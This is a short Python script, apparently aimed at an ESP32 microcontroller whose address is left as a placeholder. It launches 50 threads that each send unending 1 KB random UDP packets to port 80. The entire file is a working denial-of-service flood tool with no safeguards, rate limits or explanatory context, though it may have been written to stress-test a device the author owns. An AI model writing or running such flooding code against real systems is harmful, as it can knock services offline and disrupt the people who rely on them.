import socket
import random
import threading
import os

target = "ip-address of ESP32"
target_port = 80

def udp_flood():

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            # Generate random data (1KB)
            data = os.urandom(1024)
            # Send UDP packet to target
            s.sendto(data, (target, target_port))
            print(f"UDP packet sent to {target}:{target_port}")
        except:
            print("UDP packet failed")


for _ in range(50):
    t = threading.Thread(target=udp_flood)
    t.start()